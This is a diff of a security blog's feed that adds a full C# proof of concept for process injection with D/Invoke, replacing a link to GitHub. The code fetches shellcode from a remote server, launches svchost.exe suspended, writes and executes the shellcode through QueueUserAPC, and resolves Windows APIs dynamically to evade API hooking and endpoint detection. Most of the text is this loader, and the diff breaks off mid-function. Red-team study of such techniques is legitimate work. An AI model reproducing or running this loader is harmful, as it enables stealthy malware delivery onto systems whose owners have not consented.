@@ -235,9 +235,728 @@ To load our assembly in the target&rsquo;s memory, let&rsquo;s gzip compress and
 <em>Get-InjectedThread could no longer detect our injection</em></p>
 <h2 id="is-this-good-enough">Is this good enough?</h2>
 <p>Well no, modern AV/EDR can still nuke our work immediately, this is mainly to demonstrate a common injection technique implemented with D/Invoke.
-In Part 2, we can make our <code>svchost.exe</code> malware even more benign by PPID Spoofing, making it appear as it got spawned by <code>services.exe</code>, which is normally the case. I&rsquo;m also working on invoking system calls with D/Invoke instead of standard API calls to defeat API Hooking. Stay tuned!
-Full PoC is on my GitHub, feel free to fork :-)</p>
-]]></content></item><item><title>Certified Red Team Operator (CRTO) by Zero Point Security Review</title><link>https://jakemai0.github.io/posts/crto/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/crto/</guid><description>Introduction Red Team Ops is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of Cobalt Strike C2. When the students finish the course and pass the 48 hour exam (don&amp;rsquo;t worry, it&amp;rsquo;s not like the 300 level courses by OffSec), the students will receive the &amp;ldquo;Certified Red Team Operator&amp;rdquo; certification. If you&amp;rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka RastaMouse.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
+In Part 2, we can make our <code>svchost.exe</code> malware even more benign by PPID Spoofing, making it appear as it got spawned by <code>services.exe</code>, which is normally the case. I&rsquo;m also working on invoking system calls with D/Invoke instead of standard API calls to defeat API Hooking. Stay tuned!</p>
+<p>Full PoC is below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Diagnostics;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Net.Http;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> DInvoke_Injection
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Grab shellcode from a remote server</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">byte</span>[] sheocode;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> recv = <span style="color:#66d9ef">new</span> HttpClient())
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>				sheocode = recv.GetByteArrayAsync(<span style="color:#e6db74">&#34;https://remote_server/shellcode.bin&#34;</span>).GetAwaiter().GetResult();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			STRUCTS.STARTUPINFO startInfo = <span style="color:#66d9ef">new</span> STRUCTS.STARTUPINFO();
+</span></span><span style="display:flex;"><span>			STRUCTS.PROCESS_INFORMATION procInfo = <span style="color:#66d9ef">new</span> STRUCTS.PROCESS_INFORMATION();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Invoke functions/APIs via Delegates</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Get the pointer to the fucntions from DLLs</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Then, get the delegate for the function pointer. Store it into a variable with the same delegate type</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// CreateProcess</span>
+</span></span><span style="display:flex;"><span>			IntPtr pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;CreateProcessA&#34;</span>);
+</span></span><span style="display:flex;"><span>			DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.CreateProcess)) <span style="color:#66d9ef">as</span> DELEGATES.CreateProcess;
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Start proc in suspended state </span>
+</span></span><span style="display:flex;"><span>			createProc(<span style="color:#e6db74">&#34;C:\\Windows\\System32\\svchost.exe&#34;</span>, <span style="color:#66d9ef">null</span>, IntPtr.Zero, IntPtr.Zero, <span style="color:#66d9ef">false</span>, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED,
+</span></span><span style="display:flex;"><span>			IntPtr.Zero, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">ref</span> startInfo, <span style="color:#66d9ef">out</span> procInfo);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// VirtualAllocEx</span>
+</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>);
+</span></span><span style="display:flex;"><span>			DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualAllocEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualAllocEx;
+</span></span><span style="display:flex;"><span>			IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>, <span style="color:#ae81ff">0x04</span>); <span style="color:#75715e">//MEM_COMMIT | MEM_RESERVE; 0x04: RW</span>
+</span></span><span style="display:flex;"><span>			Console.WriteLine(<span style="color:#e6db74">&#34;Base address of remote mem space is: &#34;</span> + (<span style="color:#66d9ef">long</span>)allocret, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// WriteProcessMemory</span>
+</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;WriteProcessMemory&#34;</span>);
+</span></span><span style="display:flex;"><span>			DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.WriteProcessMemory)) <span style="color:#66d9ef">as</span> DELEGATES.WriteProcessMemory;
+</span></span><span style="display:flex;"><span>			writeProcMem(procInfo.hProcess, allocret, sheocode, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#66d9ef">out</span> UIntPtr bytesWritten);
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// VirtualProtectEx</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">uint</span> oldProtect = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualProtectEx&#34;</span>);
+</span></span><span style="display:flex;"><span>			DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualProtectEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualProtectEx;
+</span></span><span style="display:flex;"><span>			virProtEx(procInfo.hProcess, allocret, sheocode.Length, <span style="color:#ae81ff">0x20</span>, <span style="color:#66d9ef">out</span> oldProtect); <span style="color:#75715e">// 0x20: RX</span>
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// QueueUserAPC</span>
+</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;QueueUserAPC&#34;</span>);
+</span></span><span style="display:flex;"><span>			DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.QueueUserAPC)) <span style="color:#66d9ef">as</span> DELEGATES.QueueUserAPC;
+</span></span><span style="display:flex;"><span>			qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// ResumeThread</span>
+</span></span><span style="display:flex;"><span>			pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;ResumeThread&#34;</span>);
+</span></span><span style="display:flex;"><span>			DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.ResumeThread)) <span style="color:#66d9ef">as</span> DELEGATES.ResumeThread;
+</span></span><span style="display:flex;"><span>			resThrd(procInfo.hThread);
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Creating DELEGATES for functions</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// https://thewover.github.io/Dynamic-Invoke/</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DELEGATES</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for CreateProcess</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> CreateProcess(<span style="color:#66d9ef">string</span> lpApplicationName, <span style="color:#66d9ef">string</span> lpCommandLine, IntPtr lpProcessAttributes,
+</span></span><span style="display:flex;"><span>		IntPtr lpThreadAttributes, <span style="color:#66d9ef">bool</span> bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> lpCurrentDirectory, <span style="color:#66d9ef">ref</span> STRUCTS.STARTUPINFO lpStartupInfo, <span style="color:#66d9ef">out</span> STRUCTS.PROCESS_INFORMATION lpProcessInformation);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for VirtualAllocEx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for WriteProcessMemory</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, <span style="color:#66d9ef">byte</span>[] lpBuffer, <span style="color:#66d9ef">uint</span> nSize, <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for VirtualProtectEx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">int</span> dwSize, <span style="color:#66d9ef">uint</span> flNewProtect, <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for QueueUserAPC</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for ResumeThread</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">uint</span> ResumeThread(IntPtr hThhread);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for LdrLoadDll</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, <span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING ModuleFileName, <span style="color:#66d9ef">ref</span> IntPtr ModuleHandle);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Delegate for RtlInitUnicodeString</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">void</span> RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] <span style="color:#66d9ef">string</span> SourceString);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// DInvoke functions from https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Generic.cs</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DInvokeFunctions</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments, where:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// DLLName: Name of the DLL.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// FunctionName: Name of the function.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// FunctionDelegateType: Prototype for the function, represented as a Delegate object.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Parameters: Parameters to pass to the function. Can be modified if function uses call by reference.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// CanLoadFromDisk: Whether the DLL may be loaded from disk if it is not already loaded. Default is false.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ResolveForwards: Whether or not to resolve export forwards. Default is true.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// return: Object returned by the function. Must be unmarshalled by the caller.</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">object</span> DynamicAPIInvoke(<span style="color:#66d9ef">string</span> DLLName, <span style="color:#66d9ef">string</span> FunctionName, Type FunctionDelegateType, <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">object</span>[] Parameters, <span style="color:#66d9ef">bool</span> CanLoadFromDisk = <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">bool</span> ResolveForwards = <span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName, CanLoadFromDisk, ResolveForwards);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> DynamicFunctionInvoke(pFunction, FunctionDelegateType, <span style="color:#66d9ef">ref</span> Parameters);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory, where:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;FunctionPointer&#34;&gt;A pointer to the unmanaged function.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;FunctionDelegateType&#34;&gt;Prototype for the function, represented as a Delegate object.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;Parameters&#34;&gt;Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;Object returned by the function. Must be unmarshalled by the caller.&lt;/returns&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">object</span> DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">object</span>[] Parameters)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> funcDelegate.DynamicInvoke(Parameters);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Helper for getting the pointer to a function from a DLL loaded by the process, where:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;DLLName&#34;&gt;The name of the DLL (e.g. &#34;ntdll.dll&#34; or &#34;C:\Windows\System32\ntdll.dll&#34;).&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;FunctionHash&#34;&gt;Hash of the exported procedure.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;Key&#34;&gt;64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;CanLoadFromDisk&#34;&gt;Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ResolveForwards&#34;&gt;Whether or not to resolve export forwards. Default is true.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr for the desired function.&lt;/returns&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr GetLibraryAddress(<span style="color:#66d9ef">string</span> DLLName, <span style="color:#66d9ef">string</span> FunctionHash, <span style="color:#66d9ef">bool</span> CanLoadFromDisk = <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">bool</span> ResolveForwards = <span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			IntPtr hModule = GetLoadedModuleAddress(DLLName);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (hModule == IntPtr.Zero &amp;&amp; CanLoadFromDisk)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				hModule = LoadModuleFromDisk(DLLName);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (hModule == IntPtr.Zero)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FileNotFoundException(DLLName + <span style="color:#e6db74">&#34;, unable to find the specified file.&#34;</span>);
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (hModule == IntPtr.Zero)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> DllNotFoundException(DLLName + <span style="color:#e6db74">&#34;, Dll was not found.&#34;</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> GetExportAddress(hModule, FunctionHash);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Helper for getting the base address of a module loaded by the current process. This base</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/// manual export parsing. This function uses the .NET System.Diagnostics.Process class. Where:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;DLLName&#34;&gt;The name of the DLL (e.g. &#34;ntdll.dll&#34;).&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.&lt;/returns&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr GetLoadedModuleAddress(<span style="color:#66d9ef">string</span> DLLName)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">foreach</span> (ProcessModule Mod <span style="color:#66d9ef">in</span> ProcModules)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> Mod.BaseAddress;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> IntPtr.Zero;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Resolves LdrLoadDll and uses that function to load a DLL from disk, where:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;DLLPath&#34;&gt;The path to the DLL on disk. Uses the LoadLibrary convention.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.&lt;/returns&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr LoadModuleFromDisk(<span style="color:#66d9ef">string</span> DLLPath)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			STRUCTS.UNICODE_STRING uModuleName = <span style="color:#66d9ef">new</span> STRUCTS.UNICODE_STRING();
+</span></span><span style="display:flex;"><span>			RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> uModuleName, DLLPath);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			IntPtr hModule = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>			STRUCTS.NTSTATUS CallResult = LdrLoadDll(IntPtr.Zero, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">ref</span> uModuleName, <span style="color:#66d9ef">ref</span> hModule);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (CallResult != STRUCTS.NTSTATUS.Success || hModule == IntPtr.Zero)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> IntPtr.Zero;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> hModule;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Given a module base address, resolve the address of a function by manually walking the module export table, where:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ModuleBase&#34;&gt;A pointer to the base address where the module is loaded in the current process.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ExportName&#34;&gt;The name of the export to search for (e.g. &#34;NtAlertResumeThread&#34;).&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;param name=&#34;ResolveForwards&#34;&gt;Whether or not to resolve export forwards. Default is true.&lt;/param&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// &lt;returns&gt;IntPtr for the desired function.&lt;/returns&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> IntPtr GetExportAddress(IntPtr ModuleBase, <span style="color:#66d9ef">string</span> ExportName, <span style="color:#66d9ef">bool</span> ResolveForwards = <span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			IntPtr FunctionPtr = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Traverse the PE header in memory</span>
+</span></span><span style="display:flex;"><span>				Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + <span style="color:#ae81ff">0x3C</span>));
+</span></span><span style="display:flex;"><span>				Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + <span style="color:#ae81ff">0x14</span>));
+</span></span><span style="display:flex;"><span>				Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + <span style="color:#ae81ff">0x18</span>;
+</span></span><span style="display:flex;"><span>				Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+</span></span><span style="display:flex;"><span>				Int64 pExport = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (Magic == <span style="color:#ae81ff">0x010b</span>)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					pExport = OptHeader + <span style="color:#ae81ff">0x60</span>;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					pExport = OptHeader + <span style="color:#ae81ff">0x70</span>;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Read -&gt; IMAGE_EXPORT_DIRECTORY</span>
+</span></span><span style="display:flex;"><span>				Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+</span></span><span style="display:flex;"><span>				Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x10</span>));
+</span></span><span style="display:flex;"><span>				Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x14</span>));
+</span></span><span style="display:flex;"><span>				Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x18</span>));
